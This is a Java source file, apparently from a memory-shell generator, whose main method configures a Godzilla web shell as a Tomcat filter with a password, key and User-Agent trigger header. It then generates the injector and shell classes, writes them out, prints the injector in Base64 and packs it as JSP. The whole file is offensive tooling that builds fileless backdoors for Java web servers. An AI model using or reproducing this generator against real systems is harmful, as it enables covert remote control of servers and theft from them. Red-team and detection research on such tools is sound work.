package com.reajason.javaweb;

import com.reajason.javaweb.config.*;
import com.reajason.javaweb.memsell.AbstractShell;
import com.reajason.javaweb.memsell.packer.Packer;
import lombok.SneakyThrows;
import net.bytebuddy.jar.asm.Opcodes;
import org.apache.commons.codec.binary.Base64;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
public class GeneratorMain {

    public static void main(String[] args) throws IOException {
        ShellConfig shellConfig = ShellConfig.builder()
                .server(Server.TOMCAT)
                .shellTool(ShellTool.Godzilla)
                .shellType(Constants.FILTER).build();
        GodzillaConfig godzillaConfig = GodzillaConfig.builder()
                .pass("pass")
                .key("key")
                .headerName("User-Agent")
                .headerValue("test123")
                .build();
        InjectorConfig injectorConfig = new InjectorConfig();
        GenerateResult generateResult = generate(shellConfig, injectorConfig, godzillaConfig);
        if (generateResult != null) {
            Files.write(Paths.get(generateResult.getInjectorClassName() + ".class"), generateResult.getInjectorBytes(), StandardOpenOption.CREATE_NEW);
            Files.write(Paths.get(generateResult.getShellClassName() + ".class"), generateResult.getShellBytes(), StandardOpenOption.CREATE_NEW);
            System.out.println(Base64.encodeBase64String(generateResult.getInjectorBytes()));
            Packer.INSTANCE.JSP.getPacker().pack(generateResult);
        }
    }

    public static GenerateResult generate(ShellConfig shellConfig, InjectorConfig injectorConfig, ShellToolConfig shellToolConfig) {
        Server server = shellConfig.getServer();
        AbstractShell shell = server.getShell();
        if (shell == null) {
            throw new IllegalArgumentException("Unsupported server");
        }
        return shell.generate(shellConfig, injectorConfig, shellToolConfig);
    }

    @SneakyThrows
    public static byte[] generate(ShellConfig shellConfig, InjectorConfig injectorConfig, ShellToolConfig shellToolConfig, Packer.INSTANCE packerInstance) {
        GenerateResult generateResult = generate(shellConfig, injectorConfig, shellToolConfig);
        if (generateResult != null) {
            return packerInstance.getPacker().pack(generateResult);
        }
        return null;
    }
}